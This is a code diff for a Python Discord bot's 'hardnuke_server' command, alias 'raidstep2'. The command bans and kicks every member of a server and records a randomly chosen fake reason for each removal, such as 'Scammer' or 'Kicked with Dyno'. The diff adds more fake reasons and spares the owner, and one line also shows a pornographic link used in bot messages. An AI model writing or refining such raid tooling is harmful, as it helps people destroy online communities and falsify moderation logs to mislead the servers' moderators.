@@ -541,7 +541,7 @@ async def nuke_server_fr(ctx):
 @bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS', aliases=['raidstep2'])
 async def nuke_server_fr(ctx):
     rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising", "Broke rules", "Ban command used", None]
-    krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", None]
+    krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", "Repeated Warnings", "Kicked with Dyno", None]
 
     if str(ctx.author.id) != str(ownerid):
         print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
@@ -549,16 +549,18 @@ async def nuke_server_fr(ctx):
     else:
        
         for member in ctx.guild.members:
-            try:
-                await member.ban(reason=random.choice(rlist))
-            except:
-                None
+            if member.id != ownerid:
+                try:
+                    await member.ban(reason=random.choice(rlist))
+                except:
+                    None
         
         for member in ctx.guild.members:
-            try:
-                await member.kick(reason=random.choice(krlist))
-            except:
-                None
+            if member.id != ownerid:
+                try:
+                    await member.kick(reason=random.choice(krlist))
+                except:
+                    None
                 
         if False:
             print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
@@ -613,7 +615,7 @@ http://pornhub.com/**""")
                     None
         
    
-# ban part broken for now
+# updated.
 
 @bot.command(name='gg', help='GG, Stay!')
 @commands.has_permissions(administrator=True)
